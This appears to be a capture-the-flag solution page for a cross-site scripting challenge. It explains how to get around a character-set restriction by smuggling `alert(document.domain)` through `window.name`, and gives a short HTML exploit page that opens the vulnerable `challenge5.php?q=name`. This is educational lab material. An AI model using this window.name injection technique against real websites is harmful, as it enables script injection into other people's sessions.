# Challenge 5
Solution and further references for *challenge 5*.

<details>
 <summary>Spoiler: Solution for challenge 5</summary>

**Payload**:
Due to the limitation regarding the character set, one could for instance use `window.name` to pass the required `document.domain` to the vulnerable code snippet. 

Thus, to exploit the vulnerability, one needs to set `window.name` to `alert(document.domain)` and then browse to `challenge5.php?q=name`. 

**Exploit**:
```html
<!DOCTYPE html>
<html lang="en">
  <body>
    <script>
      open("challenge5.php?q=name", "alert(document.domain)")
    </script>
  </body>
</html>
```
</details>

## References
Additional information:
* https://developer.mozilla.org/de/docs/Web/API/Window/name
* https://developer.mozilla.org/en-US/docs/Web/API/Window/open